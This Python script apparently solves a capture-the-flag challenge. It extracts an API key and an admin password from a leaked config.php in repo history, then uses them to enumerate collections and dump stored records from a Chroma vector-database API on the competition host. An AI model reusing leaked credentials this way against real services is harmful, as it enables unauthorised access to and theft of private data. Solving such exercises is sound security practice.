#!/usr/bin/env python
"""VecNetDB exists. Pull its full definition, then the records inside it.

The tenant-scoped shape is what was missing: /api/v2/collections is not a Chroma 1.x route at all.
"""
import base64, json, re, urllib.error, urllib.request, sys
try: sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception: pass
CFG = open("files/repo-history/c2/config.php", encoding="utf-8").read()
KEY = re.search(r"INTERNAL_API_KEY',\s*'([^']+)'", CFG).group(1)
BASIC = base64.b64encode(b"vecadmin:" + re.search(r"MAIL_ADMIN_PASS',\s*'([^']+)'", CFG).group(1).encode()).decode()
BASE = "http://vec.web.2026.sunshinectf.games:8000"
P = "/api/v2/tenants/default_tenant/databases/default_database"
def go(method, path, body=None, hdr=None):
    h = {"Content-Type": "application/json", "X-API-Key": KEY, "Authorization": "Basic " + BASIC}
    h.update(hdr or {})
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    try:
        with urllib.request.urlopen(req, timeout=40) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()
    except Exception as e:
        return type(e).__name__, str(e).encode()

CID = "455b419b-9668-4e7e-9f44-7ed62396f184"
if __name__ == "__main__":
    st, b = go("GET", P + "/collections")
    open("analysis/collections.json", "wb").write(b)
    print("collections", st, len(b))
    print(b.decode("utf-8", "replace")[:4000])
    for p in [P + "/collections/VecNetDB", P + "/collections/" + CID]:
        st, b = go("GET", p)
        print("\nGET", p, st, b[:400])
    for p, body in [(P + "/collections/" + CID + "/get", {"ids": [], "limit": 5, "offset": 0}),
                    (P + "/collections/" + CID + "/get", {}),
                    (P + "/collections/VecNetDB/get", {}),
                    (P + "/collections/" + CID + "/count", {}),
                    (P + "/collections/" + CID + "/get", {"limit": 3, "include": ["metadatas", "documents"]}),
                    ]:
        st, b = go("POST", p, body)
        print("\nPOST", p, body, st, b[:500])
